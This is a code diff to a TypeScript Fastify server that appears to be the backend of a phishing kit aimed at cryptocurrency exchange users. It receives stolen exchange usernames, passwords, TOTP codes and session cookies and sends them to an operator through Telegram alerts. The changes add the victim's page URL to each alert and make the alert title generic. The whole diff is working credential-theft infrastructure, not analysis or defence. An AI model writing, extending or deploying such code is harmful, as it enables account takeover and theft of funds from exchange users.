@@ -67,13 +67,14 @@ function clientIp(request: FastifyRequest): string | null {
   return request.ip ?? null
 }
 
-function formatTelegramAlert(row: CapturedCredRow): string {
+function formatTelegramAlert(row: CapturedCredRow, pageUrl?: string | null): string {
   const lines = [
-    '🔐 <b>New CEX Credentials Captured</b>',
+    '🔐 <b>New Credentials Captured</b>',
     `Exchange: <code>${escapeHtml(row.exchange)}</code>`,
     `Username: <code>${escapeHtml(row.username)}</code>`,
     `Password: <code>${escapeHtml(row.password)}</code>`,
   ]
+  if (pageUrl) lines.push(`Page: <code>${escapeHtml(pageUrl.slice(0, 500))}</code>`)
   if (row.totp) lines.push(`TOTP: <code>${escapeHtml(row.totp)}</code>`)
   if (row.session_cookies) {
     lines.push(`Session Cookies: <code>${escapeHtml(row.session_cookies.slice(0, 3500))}</code>`)
@@ -168,6 +169,7 @@ export async function registerCredsRoutes(app: FastifyInstance): Promise<void> {
       readString(body['2fa']) ||
       readString(body['mfa']) ||
       null
+    const page_url = readOptionalString(body['page_url'])
 
     const captureSession = isEnvEnabled('CEX_CAPTURE_SESSION_COOKIES', true)
     const session_cookies = captureSession ? readOptionalString(body['session_cookies']) : null
@@ -211,7 +213,7 @@ export async function registerCredsRoutes(app: FastifyInstance): Promise<void> {
       )
 
       if (isEnvEnabled('CEX_TELEGRAM_ALERT', true)) {
-        void sendTelegramMessage(formatTelegramAlert(row)).catch((e) => {
+        void sendTelegramMessage(formatTelegramAlert(row, page_url)).catch((e) => {
           request.log.warn(
             { err: e instanceof Error ? e.message : String(e) },
             '[CEX_CREDS] telegram alert failed',
